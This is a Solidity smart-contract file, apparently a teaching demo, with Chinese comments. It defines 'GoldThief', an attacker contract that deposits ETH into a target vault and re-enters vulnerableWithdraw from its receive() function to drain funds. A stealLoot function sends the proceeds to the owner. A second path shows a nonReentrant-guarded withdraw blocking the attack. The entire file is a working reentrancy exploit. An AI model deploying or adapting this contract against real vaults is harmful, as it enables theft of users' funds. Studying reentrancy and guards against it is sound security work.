// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
function deposit() external payable;
function vulnerableWithdraw() external;
function safeWithdraw() external;
}

contract GoldThief {
IVault public targetVault;//要攻击的金库地址
address public owner;
uint public attackCount;//记录我们重入循环的次数。
bool public attackingSafe;//记录我们当前攻击的是哪一个版本的金库：

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");//攻击者必须在调用该函数时发送至少 1 ETH

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw();
}

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
}

receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();//- 我们检查金库是否还有 ETH 可偷,我们检查是否未达到攻击次数上限
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail due to nonReentrant
    }
}

function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}